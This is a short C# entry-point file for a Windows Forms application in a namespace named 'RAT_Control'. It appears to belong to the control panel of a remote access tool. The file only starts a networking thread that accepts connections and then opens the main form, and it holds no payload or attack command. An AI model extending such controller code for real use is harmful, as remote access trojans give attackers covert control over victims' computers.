using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using Info;

namespace RAT_Control
{
    static class Program
    {
        public static Networking a = new Networking();


        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            
           
            

            //string datatosend = Console.ReadLine();
            //server.SendData(datatosend);

            //Have to run a seperate thread, otherwise the accept() causes a loop
            Thread acceptThread = new Thread(() => a.Startup());

            acceptThread.Start();
            
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());

        }
    }
}
